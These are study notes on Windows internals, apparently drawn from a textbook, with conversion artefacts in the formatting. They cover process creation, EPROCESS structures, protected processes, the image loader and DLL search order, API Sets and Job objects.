### * It launches SERVICES.EXE (The Services Control Manager - SCM): The SCM

### is the central authority for managing all Windows services (starting, stopping,

pausing, etc.). The SCM then reads the registry to determine which services should be started and launches them.
### * It launches LSASS.EXE (Local Security Authority Subsystem Service):

### lsass.exe is fundamental for enforcing the local security policy, handling user

logons, creating access tokens, and managing Active Directory interactions.
### The Services Host and User Apps

### * SERVICES.EXE launches the first instance of SVCHOST.EXE (Service Host):

### Since DLLs are more memory-efficient than creating a new .exe process for

### every service, Microsoft groups multiple related services into a single

### svchost.exe process. This is why you see many svchost.exe instances running,

each hosting a bundle of different services.
### * User Apps and the Final Chain: After the SCM launches necessary services

(many hosted within svchost.exe), the final pieces of the UI environment are set up.
- The SCM starts the Explorer Process (explorer.exe), which manages the
desktop, taskbar, and shell.
### * SVCHOST.EXE commands and CONHOST.EXE: The command line for a

### svchost.exe process typically lists the service groups it's hosting (e.g., -k

netsvcs). You may see it starting a wide range of services.
### * CONHOST.EXE (Console Window Host): This is launched whenever a

### console application (like cmd.exe or PowerShell) is started. As you observed, it

### is often launched from a User-Mode service context to correctly manage the

console window input/output for the user.
### User Process Creation

### Process Initialization Sequence

A description of the steps taken by the system in an average process creation sequence.
- The creation of the process object and new address space is the first step.
### When a process calls the Win32 API CreateProcess, the API creates a process

object and allocates a memory address space for the process.
- CreateProcess maps NTDLL.DLL and the program executable (.exe file) into
the newly created address space.
- CreateProcess creates the process's first thread and allocates Stack Space
for it.
- The process's first thread is resumed and starts running in the LDRpInitialize
function inside NTDLL.
### * LDRpInitialize recursively traverses the primary executable's import tables

and maps into memory every module that is required for running the primary executable.
### * At this point, control is passed to LDRP_Initialize_TLS_Routines, which is an

internal NTDLL.DLL routine responsible for initializing all statically linked DLLs currently loaded into the address space.
### * Once all DLLs are initialized, LDRpInitialize calls the thread's Real

### Initialization Routine, which is the BaseProcessStart function from

### Kernel32.DLL. This function in turn calls the executable's WinMain entry point,

at which point the process has completed its initialization sequence. Native Component
### NTDLL.DLL contains two function types:

- System Service Dispatch Stubs to the Windows Executive System Services.
### These functions are exposed to the User Mode. Each of these functions

### contains the architecture-specific instruction that can cause a transition into

### Kernel Mode to invoke the system service dispatcher, which then calls the

actual kernel-mode system service that contains the real code inside
## Ntoskrnl.Exe.

- Internal Support Functions used by subsystems, subsystem DLLs, and other
native images.
### * Support functions include: The Image Loader (functions that start with Ldr),

### Heap Manager functions, and common general Runtime Library Routines

### (functions that start with Rtl), support for User-Mode Asynchronous Procedure

Calls (APC), and a subset of Client Runtime (CRT) Routines.
### Native in this context refers to images that are not tied to any particular

### subsystem. Some images (executables) don't belong to any subsystem. They

don't link against a set of subsystem DLLs. Instead, they are exposed via
## Ntdll.

### The Environment Subsystem's Role

### The role of an Environment Subsystem is to expose a subset of the bare

### Windows Executive system services to application programs. Each

### Executable Image ($\text{.exe}$) is bound to one and only one subsystem,

### indicated in the $\text{PE}$ Image header. When an Image is run, the process

creation routine examines the subsystem type and notifies the proper subsystem of the new process.
### The libraries that programs link to do not call Windows kernel services

directly. Instead, their high-level function calls are routed through one or more
### Subsystem DLLs (the API libraries), which then make the documented native

system calls (e.g., through $\text{ntdll.dll}$). Subsystems are started by the Session Manager ($\text{smss.exe}$).
### The Win32 API and Subsystem DLLs

The $\text{Win32}$ Subsystem Image is the crucial primary environment for
### most applications. Its functionality is exposed to user processes via a set of

### core DLLs often referred to as $\text{Win32}$ Subsystem Libraries. These

are loaded into virtually every $\text{Win32}$ user-mode process: DLL Name Primary Role in the Win32 API kernel32.dll Core APIs. Fundamental library for most $\text{Win32}$ functions, including those for process creation and memory management. advapi32.dll Advanced APIs. Functions related to security (like access control, tokens) and Service Management. user32.dll User Interface. Manages high- level GUI constructs like windows, menus, and user input, and communicates with the kernel component $\text{Win32k.sys}$. gdi32.dll Graphics. Provides the GDI (Graphics Device Interface) functions for drawing graphics, text, and managing fonts, also communicating with $ \text{Win32k.sys}$.
### The Win32 Subsystem Implementation (Kernel and User Components)

### The $\text{Win32}$ Subsystem is the component responsible for every aspect

of the Windows User Interface. It is composed of both kernel and user
### components:

### Kernel Component: The low-level graphics engine and user

management is implemented inside the Win32k.sys kernel component.
### User Components: The user-mode DLLs User32.dll and GDI32.dll

control the functionality inside $\text{Win32k.sys}$.
### Important: The components considered the Win32 Subsystem are not

### responsible for the entire $\text{Win32}$ API; they are only responsible for the

### User and GDI portions. Core process functions rely on $\text{NTDLL}$ and the

$\text{Executive}$ via libraries like $\text{Kernel32.dll}$.
### The Client/Server Runtime Subsystem ($\text{CSRSS.EXE}$)

### The Client/Server Runtime Subsystem Process ($\text{CSRSS.EXE}$) is a

persistent server process that provides shared services to $\text{Win32}$ client applications.
The $\text{CSRSS}$ process was originally responsible for managing Console Windows.
### Since Windows 7, console applications (cmd.exe) communicate with a

### separate process, the Console Host ($\text{conhost.exe}$), which is

### spawned from the console-based process rather than $

### \text{CSRSS.EXE}$. $\text{conhost.exe}$ is designated as a server,

and the console-using process is the client.
### Console Creation is initiated by the Image Loader for console

subsystem Images or on demand if a $\text{GUI}$ Subsystem Image calls the AllocConsole Windows API.
### The role of $\text{CSRSS.exe}$ and certain DLLs, as well as the use of $

### \text{RtlCreateUserProcess}$ from $\text{Ntdll.dll}$ for creating processes with

### the Native Subsystem image type, highlight the complexity of the OS

### architecture. Understanding the base APIs offered by the Operating System can

### be helpful in deciphering programs. An application making a sequence of

system API calls is essentially talking to the O.S., and the API is the language. If you understand the basics, you can tune into that conversation.
### The main confusion stems from three related but distinct layers:

### The Environment Subsystem (Concept): The $\text{Win32}$

### Subsystem is the primary environment $^$* that runs most Windows

### applications. The $\text{NT}$ Executive doesn't care what an $

### \text{EXE}$ does; the Subsystem provides the necessary API

language for the $\text{EXE}$ to run (e.g., $\text{Win32}$ vs. $ \text{POSIX}$).
### Subsystem DLLs (API Implementation): Libraries like kernel32.dll,

### advapi32.dll, gdi32.dll, and user32.dll are the USER-MODE

### IMPLEMENTATION of the $\text{Win32}$ API. They translate high-

### level calls (like CreateProcess) into low-level native system calls (like

NtCreateUserProcess in $\text{ntdll.dll}$).
### $\text{CSRSS.EXE}$ (Server Process): The Client/Server Runtime

### Subsystem is a SERVER PROCESS that runs in the background. It

provides essential services that cannot be run in the user's process for security/isolation reasons, primarily: Legacy Console management. State management for $\text{Win32}$ processes.
### Standard Windows applications using the CreateProcess (or its internal

### CreateProcessInternal) API cannot directly create processes that use the native

### subsystem image type (which typically includes system processes like the

### initial boot process or certain driver-loading processes). The high-level

### Windows API is designed to create standard Win32 user-mode processes, To

### bypass this restriction and allow certain system-level components to create a

### native process, the native library, Ntdll.dll, provides the RtlCreateUserProcess

### helper function. This function is essentially a user-mode wrapper that calls the

lower-level, non-public kernel-mode function NtCreateUserProcess to
### successfully create a process with the native subsystem type. As its name

### suggests, NtCreateUserProcess is used for the creation of user-mode

processes [there is a function with the same name (NtCreateUserProcess), part of the Executive; Kernel Mode]
## Processes & Jobs

### The Windows API provides several functions for creating a process:

CreateProcess - which attempts to create a process with the same access token as the creating process.
### CreateProcessAsUser - accepts an extra argument, a handle to a

Token Object, often obtained by calling LogonUser and using the resulting token.
### CreateProcessWithTokenW / CreateProcessWithLogonW - the

latter is a handy shortcut to log on with a given user's credentials and create a process.
### Both calls ultimately route the request to the Secondary Logon

### Service (seclogon.dll—hosted in an svchost.exe instance) via a

Remote Procedure Call (RPC) to the system to do the actual process creation. seclogon.exe executes the call and, if all goes well, eventually calls the same underlying functions.
### All these functions expect a proper Portable Executable (PE), batch file, or

### 16-bit COM Application. Ultimately, all these functions lead to a common

### internal function CreateProcessInternal, which starts the actual work of

c r e a t i n g a W i n d o w s p r o c e s s . C r e a t e P r o c e s s I n t e r n a l c a l l s
### NtCreateUserProcess in NTDLL.DLL to make the transition to Kernel Mode

### and initiate the kernel-mode part of process creation in the Executive function

with the same name, NtCreateUserProcess, which is part of the Executive.
### Each Windows process is represented by an Executive Process Structure ($

### \text{EPROCESS}$). Besides containing many attributes relating to a process,

### an $\text{EPROCESS}$ contains pointers to a number of other related data

### structures. For example, each process has one or more threads, each

represented by an Executive Thread Structure ($\text{ETHREAD}$).
### For each process that is executing a Windows Program, the Windows

### Subsystem Process ($\text{CSRSS.EXE}$) maintains a parallel structure

### called the CSR_PROCESS. The kernel-mode part of the Windows Subsystem

### (Win32k.sys) maintains a per-process data structure—W32_PROCESS—

### created the first time a thread calls a Window, GDI (Graphics Device

### Interface), or USER function that is implemented in Kernel Mode. This also

### happens as soon as the User32.dll library is loaded. Many other drivers and

### System Components, by registering process creation notifications, can

choose to create their own data structures to track info they store on a per- process basis. The first member of the Executive Process Structure ($\text{EPROCESS}$) is
### called the Process Control Block (PCB). It is a structure of type $

### \text{KPROCESS}$ (for Kernel Process). Although routines in the Executive

### store info on $\text{EPROCESS}$, the Dispatcher, the Scheduler, and

### Interrupt/Time Accounting routines—being part of the Kernel—use $

### \text{KPROCESS}$ structures internally. This allows a layer of abstraction to

### exist between the Executive's high-level functionality and its underlying low-

level implementation of context functions, and helps prevent unwanted dependencies between the layers.
### In the kernel debugger, these data structures can be inspected by typing the

command dt (Display Type) followed by the structure name. For example, dt nt!
### _eprocess UniqueProcessId displays the process ID. To display the PCB, use

dt nt!_eprocess pcb. You can recurse the view by adding more field names.
### Use the -r switch of the dt command to recursively display all the

### substructures. Adding a number after the switch controls the depth of

### recursion the command will follow. Note that the dt command shows the

format of the selected structure, not the contents of any particular instance of that structure type.
### To show an instance of an actual process, specify the address of an $

### \text{EPROCESS}$ structure as an argument to the dt command. To get the

### addresses of almost all the $\text{EPROCESS}$ structures in the system, you

### can use the command !process 0 0. Because the $\text{KPROCESS}$ is the

### first thing in the $\text{EPROCESS}$ (it occupies the starting address), the

### address of an $\text{EPROCESS}$ will work as the address of a $

\text{KPROCESS}$ with the command dt nt!_kprocess address.
### The kernel debugger !process command displays a subset of info on a process

object and its associated structures. If a process ID or address isn't specified, !
### process lists info for the process owning the thread currently running on CPU

0, which will be WinDbg or LiveKd itself on a single-processor system.
### The $\text{PEB}$ (Process Environment Block) resides in the user-mode

### address space of the process it describes. It contains information needed by

### the Image Loader, Heap Manager, and other Windows Components that need

### to access it from User Mode. It would be too expensive to expose all that info

through system calls. The $\text{KPROCESS}$ and $\text{EPROCESS}$ structures are in Kernel Mode.
### The CSR_PROCESS structure contains info about processes that is specific to

### the Windows Subsystem ($\text{CSRSS}$). As such, only Windows

### applications have a CSR_PROCESS structure associated with them (for

### example, smss.exe does not). Because each session has its own instance of the

### subsystem, the CSR_PROCESS structures are maintained by the $

### \text{CSRSS}$ process within each individual session. The W32_PROCESS

### structure contains all the info that the Windows Graphics & Management

### code in the Kernel ($\text{Win32k.sys}$) needs to maintain state information

about all processes that use at least one USER/GDI system call.
## Protected Processes

Protected Processes add significant access limitations to the access rights
### that other processes on the system can request, even when the process is

### running as a system privileged user. The Operating System will allow a

### process to be protected only if the Image file has been digitally signed with

### a special Windows Media Certificate. The Audio, Video, Graphics

### Processes, Windows Error Reporting ($\text{WER}$), and the System

### process itself are protected to preserve integrity. $\text{wmplayer.exe}$ is a

protected process because protected music content can be decoded through it.
### At the kernel level, support for protected processes is twofold. The bulk of

### process creation occurs in Kernel Mode to avoid Injection Attacks. Protected

### processes have special bits set in their $\text{EPROCESS}$ structure

### —"Protection Locks"—that modify the behavior of security-related routines in

### the Process Manager to deny certain access rights that would normally be

### granted to Administrators. The only access rights that are granted for protected

processes are PROCESS_QUERY_INFORMATION, PROCESS_TERMINATE, and PROCESS_SUSPEND_RESUME.
### An extension to the protected process model was introduced, called Protected

### Process Light ($\text{PPL}$), which adds an additional layer to the quality of

### being protected: ATTRIBUTE VALUES. The different Signers have different

### Trust Levels, which in turn results in certain $\text{PPL}$ processes being

### more or less protected than others. Standard protected processes are now

### also differentiated based on the Signer Value. The various recognized Signers

also define which access rights are denied to lesser protected processes.
### Protection Levels are defined by the Signer Value. The $\text{WinTcb}$

### (Windows Trusted Computing Base Signer), used for the System process, is

### leveraged to protect critical processes that the kernel has intimate knowledge

### of. The power of a process is measured by its Protection Level: $

### \text{Protected Processes}$ $>$ $\text{PPLs}$ $>$ $\text{Standard Processes}

$. Higher-value signer processes have access to lower-level protected processes.
### The protection level of a process also impacts which DLLs it will be allowed

### to load, effectively preventing a legitimate protected process from being

### coerced into loading a malicious third-party library, which would then

### execute with the same protection level as the process. A check is implemented

### by granting each process a "Signature Level," which is stored in the

### SignatureLevel field of the $\text{EPROCESS}$ structure. Through an internal

### lookup table, it finds a corresponding "DLL Signature Level," stored as

### SECTION_SIGNATURE_LEVEL in $\text{EPROCESS}$. Any DLL loading into

### the process will be checked by the Code Integrity Component in the same

### way the main executable is verified. Therefore, a process with "WinTcb" as its

executable signer will only load "Windows" or higher signed DLLs.
### If you run Process Explorer and select the Protection check box in the

### Process Image Tab to view the Protection Column: if you select a protected

### process to look at the lower part to view DLLs, you will see nothing. This is

### because Process Explorer uses a User Mode API to query the loaded

modules, which requires access that's not granted for protected processes. Exception: $\text{Process Explorer}$ will show the list of loaded kernel
modules (drivers) since these are not DLLs within the process address space.
### One possible way malware can attack a system is by injecting code inside a

### process, or better, injecting code specifically inside an Anti-Malware

### Service and thus tamper with or disable its functions. If, however, the AM

### service could run as a Protected Process Light ($\text{PPL}$), no code

### injection or process termination would be allowed, meaning that the AM

### software would be protected from attack. To enable this, the AM kernel

### driver needs Early-Launch Anti-Malware ($\text{ELAM}$), which is granted

### by Microsoft (after proper verification of the software's publisher). ELAM

### CERTIFICATE INFO is a custom resource section in the AM executable file,

### loaded once the ELAM is installed and loaded. Once the Code Integrity

System recognizes any file signed with such a special certificate, it permits the process to request a $\text{PPL}$ of PS_PROTECTED_ANTIMALWARE_LIGHT ($\text{0x31}$).
### FLOW OF CREATE Process

Creating a Windows process consists of several stages carried out in three
### parts of the Operating System:

Validate parameters and Subsystem flags, converting them to their native counterparts. Open the process Executable Image file (.exe) to be executed inside the process. Create the Windows Executive Process Object. Create Initial Thread Object.
### Perform Windows Subsystem specific process Initialization (e.g.,

setup for the new process in $\text{CSRSS}$). Start Execution of the Initial thread. Complete the Initialization of the address space (e.g., load system DLLs). CreateProcessInternalW performs the initial call to NtCreateUserProcess to attempt creation of the process.
### The user-specified attribute list is converted from the Windows Subsystem

format ($\text{Win32}$) to native format. Most of the gathered info is c o n v e r t e d t o s i n g l e l a r g e s t r u c t u r e o f t y p e
## Rtl_User_Process_Parameters.

### NtCreateUserProcess first validates arguments and builds an internal

### structure to hold all process creation information. Argument validation is

### managed to make sure the call to the Executive didn't originate from a hack

### that managed to simulate the way $\text{NTDLL}$ makes the transition to the

kernel with bogus or malicious arguments.
### NtCreateUserProcess attempts to find the appropriate Windows Image that

### will be the executable file specified by the caller and to create a Section

Object to later map it into the address space of the new process.
If a process needs to be created Protected, it checks the signing policy.
### If created as a modern application, a Trustlet, the Section Object must

be created with a special flag that allows the Secure Kernel to control it.
### If NtCreateUserProcess finds a valid Windows Executable Image, it looks in

### the registry under $\text{IFEO}$ (Image File Execution Options) at

### HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File

### Execution Options to see whether a debugger is set for the filename extension

### of the executable image. On the other hand, if the image isn't a Windows

### Executable (e.g., MS-DOS/Win16 app), CreateProcessInternalW goes through

### a series of steps to find a Windows Support Image to run it. This process is

### necessary because non-Windows apps aren't run directly; Windows instead

### uses one of a few special support images (e.g., NTVDM.exe) that are

responsible for actually running the non-native application.
### After NtCreateUserProcess opens a valid executable and creates a Section

### Object to map it into the new process address space, it creates a Windows

### Executive Process Object to run the Image by calling the internal system

function PspAllocateProcess. Creating the Executive Process Object involves
### the following sub-stages:

### A list of Performance Options exists under the Registry $\text{IFEO}$

### key called PerfOptions, which may consist of any number of fields

### (e.g., IoPriority, PagePriority, CpuPriorityClass,

WorkingSetLimitInKB). This work is done by the KeInitializeProcess routine.
### The next stage of PspAllocateProcess is the Initialization of the $

\text{KPROCESS}$ Structure (the PCB member of $ \text{EPROCESS}$). The routine that does the most work in setting up the process address space is MmInitializeProcessAddressSpace. The Virtual Memory Manager initializes the process Working Set List.
### The Section Object is now mapped into the new process's address

space, and the Process Section Base Address is set to the base address of the Image. The Process Environment Block ($\text{PEB}$) is created and initialized. $\text{NTDLL}$ is mapped into the process.
### A new Session will be created for the process, if requested—

implemented for the benefit of the Session Manager ($ \text{smss.exe}$).
### NtCreateUserProcess calls MmCreatePeb, which maps system-wide

### National Language Support tables into the new process's address space. It

### calls MiCreatePebOrTeb to allocate a page for the $\text{PEB}$/$\text{TEB}$

### and then initializes a number of fields, most of them based on internal values

that were configured through the registry (e.g., $\text{MmHeap}$ values, $
### \text{MmInitialSectionName}$ values, $\text{MmMinimum}$ and $

### \text{StackCommit}$ values). Some of them can be overridden by settings in

the linked executable Image, such as the Windows Version in the PE Header.
### The PspCreateThread routine is responsible for all aspects of thread creation

### and is called by NtCreateThread when a new thread is being created. Because

### the initial thread is created internally by the kernel without User-Mode input,

### two helper functions/routines that PspCreateThread relies on are used instead:

PspAllocateThread handles the actual creation and initialization of the Executive Thread Object itself.
### PspInsertThread handles the creation of the thread handle and

### security attributes, and also calls KeStartThread to turn the

Executive Thread Object ($\text{ETHREAD}$) into a schedulable thread.
### Process Completion, Termination, and Image Loader

### Once NtCreateUserProcess returns a success code, the necessary Executive

### process and thread objects have been created, and CreateProcessInternalW

### then performs subsequent operations related to Windows Subsystem-

specific initialization to finish initializing the process.
### Among many of these operations:

The Windows Subsystem duplicates a handle. The CSRSS process structure CSR_PROCESS is allocated and initialized. The CSRSS thread structure CSR_THREAD is allocated and initialized.
### CsrCreateProcess and CsrCreateThread insert the process and

thread into the list of threads for the process. Thence, the count of processes in this session is incremented. The new CSR_PROCESS structure is inserted into the list of Windows Subsystem-wide processes.
### At this point, the process has been allocated, the process has a thread, and the

Windows Subsystem knows about the new process.
### The new thread begins life running the kernel-mode thread startup routine

### KeStartUserThread, which lowers the thread's IRQL (Interrupt Request Level)

### from DPC (Deferred Procedure Call) level to an APC (Asynchronous

### Procedure Call) level and then calls the system initial thread routine

### PspUserThreadStart. The user-specified thread start address is passed as

### a parameter to the routine. PspUserThreadStart uses the address of the

### actual image entry point and start parameter and calls the application's entry

point. These two parameters have also already been pushed onto the stack by the kernel.
### Terminating a Process

### A process can exit gracefully by calling the ExitProcess function. The process

startup code for the first thread calls ExitProcess on the process's behalf
### when the thread returns from its main function. Graceful Termination means

### that DLLs loaded into the process get a chance to do some work by getting

notified of the process exit using a call to their DllMain function with the DLL_PROCESS_DETACH reason. ExitProcess can be called only by the process itself asking to exit.
### Ungraceful Termination of a process is possible using the TerminateProcess

### function, which can be called from outside the process. TerminateProcess

re q u i re s a h a n d l e t o t h e p ro c e ss t h a t i s o p e n e d w i t h t h e
### PROCESS_TERMINATE access mask, which may or may not be granted. That's

### why it's not easy (or impossible) to terminate some processes (e.g., csrss.exe)

### because the handle with the required access mask cannot be obtained by the

### requesting user. "Ungraceful" means DLLs don't get a chance to execute

### code ($\text{DLL_PROCESS_DETACH}$ is not sent) and all threads are

terminated abruptly. This can lead to data loss in some cases.
### In whatever way a process ceases to exist, there can never be memory leaks

### because all the process's private memory is freed automatically by the

### kernel, the address space is destroyed, and all handles to kernel objects are

closed. If open handles to the process still exist, then other processes can still
### get access to some process-related info (e.g., GetExitCodeProcess). Once

these handles are closed, the $\text{EPROCESS}$ structure is properly killed.
### Image Loader (LDR)

### Most of the actual initialization work is done outside the kernel by the Image

### Loader, internally referred to as LDR, which lives in the User-Mode system

### DLL ($\text{NTDLL.DLL}$). What makes it special is the guarantee that it will

### always be present in the running process (i.e., $\text{NTDLL}$ is always

### loaded). LDR is the first piece of code to run in user mode as part of a new

### process. Although the loader runs before the actual application code, its

### initialization tasks are hidden. A program typically does interact with its

interfaces during the runtime of a program via loading/unloading of DLLs.
### The tasks performed by LDR are critical:

Initializes the User Mode state for the application. Creating the Initial Heap and setting up Thread Local Storage ($ \text{TLS}$).
### Parsing the Import Table ($\text{IAT}$) of the application to look for

### all DLLs that it requires, followed by parsing the Export Table of the

DLLs to make sure the function is actually present.
### Loading and Unloading DLLs at Run Time, maintaining a list of all

loaded modules (the Modules Data Structures).
### Handling Manifest Files needed for Windows Side-by-Side ($

\text{SxS}$) support and Multiple Language User Interface ($ \text{MUI}$). Reading the App Compatibility database for any shims and loading the Shim Engine DLL if required. Enabling Dynamic Runtime Compatibility Mitigations and the
Switchback Mechanisms.
### Enabling support for API Sets Redirection that allows creating

Universal Windows Platform ($\text{UWP}$) Apps. Most of these tasks are critical to enabling an application to actually run its code. Binary Planting & DLL Preload Attack $\rightarrow$ Safe Search Mode
### To prevent security risks associated with DLL Preload Attacks (or Binary

Planting), Windows checks directories in a specific order to find the DLL file it needs.
### The traditional "DLL Name Resolution & Redirection Search Path" is a list of

### locations that is searched sequentially for a file with a matching name. To

### mitigate the security risks associated with this behavior, Safe Search Mode

was introduced to the path search component.
### Under Safe Search Mode, the current directory is moved behind the three

### primary system directories, resulting in the following search order:

The directory from which the application was launched.
### The native Windows system directory $\rightarrow$ \System32\

### The 16-bit Windows System directory $\rightarrow$ \System\

The Windows root directory $\rightarrow$ C:\Windows or
### %SystemRoot%

The current working directory at application launch time. Any directories specified by the %PATH% Environment Variable.
### The application can change specific path elements by editing the %PATH%

### variable using the SetEnvironmentVariable API, or by changing the current

### directory using the SetCurrentDirectory API. When the latter is used, the

directory replaces the current directory in the search path.
### A process can also use the SetDllDirectory API to specify a DLL Directory for

### the process. When a DLL Directory is specified, the loader ignores the Safe

Search mode and inserts this directory into the search path.
### Callers can also modify the DLL Search path for specific load operations by

### supplying various Search Path Flags to the LoadLibraryEx API. If the DLL

### name supplied to the API specifies a full path string, the path containing the

### DLL file is used in place of the application directory when computing the

### search path for the operation. All these flags modify the search order to only

### search the specific directory(ies) that the flag references, or the flags can be

combined as desired to search multiple locations.
### These flags can be set globally using the SetDefaultDllDirectories API, which

will affect all library loads from that point on globally.
### The search-path order can also be affected if the application is a packaged

### application ($\text{UWP}$). In this case, the LoadPackagedLibrary API is

### used. The package-based search graph is computed based on the

<packageDependency> entries in the UWP App Manifest file's
### <Dependencies> section, guaranteeing that no arbitrary DLL can accidentally

load in the package before doing the normal search.
### DLL Name Redirection

DLL Name Redirection is Windows' way of intercepting or re-routing loading to a different file or location.
### WinAPI Set Redirection: This mechanism allowed different versions/

### editions of Windows to change the binary exports for a given API in a

### manner that is transparent to applications, by introducing the

concept of "contracts" (e.g., modern apps target specific API contracts).
### Local Redirection: This allows apps to redirect all loads of a specific

DLL base name to a local copy of the DLL in the application directory.
### This is done either by creating a copy of the DLL with the same base

### name followed by .local or by creating a file folder with the name local

under the App directory and placing a copy of the DLL inside.
### Fusion ($\text{SxS}$) Redirection: This allows components to

### express more detailed binary dependency information (versioning

### info) by embedding binary resources known as manifests. Since

### multiple versions of the same DLL often exist, Fusion lets each app

### specify which version it needs using a manifest (a small $\text{XML}$

### file embedded inside the $\text{EXE}$). Windows then loads the exact

version from the Win SxS (Side-by-Side) Store.
### Known DLL Redirection: This is a mechanism that maps specific DLL

### base names to files in the system directory, preventing the DLL from

being replaced with an alternate version in a different location.
### Loader Module Database

The loader maintains a list of all modules that have been loaded by a process— the "Loaded Modules Database".
### This information is stored in the $\text{PEB}$ (Process Environment Block)

### in a substructure identified by LDR and called PEB_LDR_DATA. The routine

### maintains three doubly linked lists containing structures called Loader Data

Table Entries ($\text{LDR_DATA_TABLE_ENTRY}$) that store information about each module.
### The kernel also employs its own loader for drivers and dependent DLLs, with a

### similar loader entry structure called KLDR_DATA_TABLE_ENTRY instead. The

### kernel-mode loader has its own database of such entries, which is directly

accessible through the PsActiveModuleList global data variable.
### To dump the kernel's module database, you can use the kernel debugger

command: dt nt!_KLDR_DATA_TABLE_ENTRY nt!PsActiveModuleList. Import Parsing
### The Image Loader (LDR), which is the first piece of User-Mode code to run,

### performs critical steps to get the application ready:

Load each DLL referenced in the Import Table of the process's executable Image.
### Module Parsing/Checking: Check whether the DLL has already been

### loaded by examining the Module Database (PEB_LDR_DATA). If it

doesn't find it in the list, the loader opens the DLL and maps it into memory.
### Name Resolution/Redirection: During the mapping operation, the

### loader first looks at the various paths where it should attempt to find

this DLL ("Name Resolution Redirection Search Path"). Once a DLL has been found and mapped, the loader checks whether the kernel has loaded it somewhere else.
### Relocation: If the loader detects relocation (necessary due to ASLR—

### Address Space Layout Randomization), it parses the relocation info

in the DLL and performs the operations to fix up internal pointers.
### Database Update: The loader then creates a Loader Data Table

Entry for this DLL and inserts it into the database (PEB_LDR_DATA).
### Recursing Imports: After a DLL has been mapped, the process is

repeated for the DLL to parse its Import Table for all its dependencies.
### Import Address Table (IAT) Filling: After each DLL is loaded, the

### loader parses the Import Address Table to look for specific functions

### being imported. The Import Table of an $\text{EXE}$ Image can be

bound (i.e., at link time, developers assign static addresses/pointers
### to imported functions in external DLLs), removing the need for lookup,

### but assumes that the DLLs the application will use will always be

### located at the same address. Windows, however, uses ASLR, so this is

usually not the case for system applications and libraries.
### Forwarder Check: The Export Table of an imported DLL can use a

### forwarder entry, meaning that the actual function is implemented in

### another DLL. This must essentially be treated like an import or

### dependency, so after parsing the Export Table, each DLL referenced

by a forwarder is also loaded by the loader.
### The complete recursive process flow for the LDR is:

### Load each DLL in the Import Table $\rightarrow$ 2. Check if the DLL is

already loaded $\rightarrow$ 3. Find the DLL (Search path/Known
### DLLs) $\rightarrow$ 4. Relocation $\rightarrow$ 5. Add to loader's

### database $\rightarrow$ 6. Recursing Imports $\rightarrow$ 7. Fill in $

\text{IAT}$ $\rightarrow$ 8. Bound Imports $\rightarrow$ 9. Forwarders.
### Post-Import Process Initialization

### Once all imports are loaded ($\text{LdrInitState} \rightarrow 2$), the process

proceeds through final initialization steps ($\text{LdrInitState} \rightarrow 3, 4$): Debugger Breakpoint triggered (if present). Subsystem setup (Console/GUI). DllMain is called for each DLL loaded with the DLL_PROCESS_ATTACH reason. $\text{TLS}$ (Thread Local Storage) Initializers run. Shim Engine Callback (if any compatibility shims were loaded). Subsystem port initialization. $\text{ETW}$ event logged. Stack Memory Committed. Switchback and API Sets
### SWITCHBACK: A Compatibility Time Machine

### Switchback is a Compatibility Time Machine for old apps. When Microsoft

### improves or fixes APIs, those changes might accidentally break old programs

that relied on the old or buggy behavior.
### Each Windows DLL may contain several branch points—places where

the API code changes based on version behavior. The loader reads your app's manifest to store its chosen GUID in the $\text{PEB}$. When your app calls a system API, the entry point first calls the Switchback Engine (a switch procedure).
### This engine checks: "What Windows version does this app think it's

running under?" and "Which version of this API matches the code contract?".
### Then it calls the correct code pointer. This lets two apps on the same

### PC call the same API but get different results, depending on their

### declared Compatibility Mode, where both versions of the API exist in

the same system. Each process gets the version-correct API functions. Therefore, Switchback uses API Redirection for specific application compatibility scenarios.
### API Sets: Modularity for Windows

### There is a much more pervasive redirection mechanism used in Windows for all

### applications called API Sets. Its purpose is to enable fine-grained API

### categorization of Windows APIs into Sub-DLLs instead of having large multi-

### purpose DLLs that span nearly thousands of APIs that might not be needed on

all types of Windows systems today and in the future.
### API Sets are about Modularity. Instead of one huge toolbox for every job

(Kernel32.dll), Windows split it into smaller boxes labeled api-ms-win-core-file-
### l1-1-0.dll or api-ms-win-core-registry-l1-1-0.dll such that embedded systems

can remove parts not required. This helps Windows refactor internal DLLs without breaking compatibility.
### The mapping of these Virtual "API Set" DLLs to their real ones (like

### Kernelbase.dll) is defined in ApiSetSchema.dll, which is loaded at process

### startup. If an app says it imports api-ms-win-core-file-l1-1-0.dll, Windows

checks the schema and redirects it to the real DLL (Kernel32.dll or Kernelbase.dll).
### The ApiSetSchema.dll contains no executable code, but it has a

### section called .apiset that contains API Set Mapping Data that maps

Virtual API Set DLLs to Logical DLLs that implement the API itself.
### Whenever a new process starts, the Process Manager maps this

### section object into the process's address space and sets the

### ApiSetMap field in the process $\text{PEB}$ to point to the base

address where the section object was mapped. Jobs, Nested Jobs, & Windows Containers Jobs
### A Job is a nameable, securable, shareable kernel object that allows control

### of one or more processes as a group, allowing groups of processes to be

### managed and manipulated as a unit. A process's association with a Job object

### can't be broken, and all processes created by the process (its descendants)

### are associated with the same Job object. The Job object records basic

accounting information for all processes associated with the Job. The following are some of the CPU, memory, Disk, and I/O-related limits you
### can specify for a Job:

Maximum Number of Active Processes (processes that have not yet terminated). Job-Wide and Per-Process User-Mode CPU Time limits. Job Processor Affinity. Job Process Priority Class. Process and Job Committed Virtual Memory limits. Job Group Affinity. Default Working Set Min/Max. CPU Rate Control (enables throttling).
### Network Bandwidth Rate Control (enabling setting DSCP tags for

Quality of Service ($\text{QoS}$) purposes for network packets).
### User-Interface Limits (e.g., restricts processes from opening handles

### to Windows owned by threads outside the Job). These limits are

managed by the Windows Subsystem GDI/USER driver ($ \text{Win32k.sys}$).
●Disk I/O Bandwidth Rate Control (enables setting number of I/O Operations Per Second ($\text{IOPS}$)).
### A Job Object is created using the CreateJobObject API; it's initially created

### empty of any processes. To add processes to a Job, call the

AssignProcessToJobObject API, which can be called multiple times to add multiple processes to the Job.
### The SetInformationJobObject API allows setting of the limits and contains

### internal Information Classes used for management. These values can be read

### back with QueryInformationJobObject, which provides interested parties with

### the limits set on a Job. TerminateJobObject terminates all processes in the

Job, similar to calling TerminateProcess on each process.
### Nested Jobs

### Starting with Windows 8 and Server 2012, a process can be associated with

### multiple Jobs, effectively creating a hierarchy known as Nested Jobs, where a

### child Job holds a subset of processes of its parent Job. Once a process is

added to more than one Job, the system tries to form a hierarchy, if possible. A current restriction is that Jobs cannot form a hierarchy if any of them set User-Interface limits. Job limits for a child Job cannot be more permissive than its parent, but they can be more restrictive.
### Job Notifications

### Jobs can be associated with an I/O Completion Port Object, which other

